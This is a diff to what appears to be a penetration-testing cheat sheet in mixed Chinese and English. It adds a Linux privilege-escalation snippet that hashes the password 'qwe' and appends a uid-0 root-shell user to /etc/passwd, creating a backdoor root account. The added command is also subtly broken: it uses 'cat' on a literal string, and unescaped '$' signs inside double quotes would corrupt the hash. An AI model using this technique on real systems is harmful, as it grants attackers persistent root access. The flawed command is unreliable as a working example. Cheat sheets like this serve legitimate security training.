@@ -521,6 +521,12 @@ gobuster vhost -u <http://example.com> -w /path/to/wordlist.txt --append-domain 
 靠山吃山，靠水吃水
 - [GTFOBins](https://gtfobins.github.io/)
 
+生产password密码 (qwe~qwe)
+```bash
+openssl passwd -1 -salt qwe qwe > hash.txt # generate a user line
+cat "qwe:$1$qwe$D95bkH3CwpH6ffYU7pu0m/:0:0:root:/root:/bin/bash" >> /etc/passwd # Append this line into passwd file
+```
+
 ## 3.0 Shells
 
 - better shell, <u>[*👉🏻GO*](./3.Privilege-Escalation/Linux/Better-Shell.md)</u>
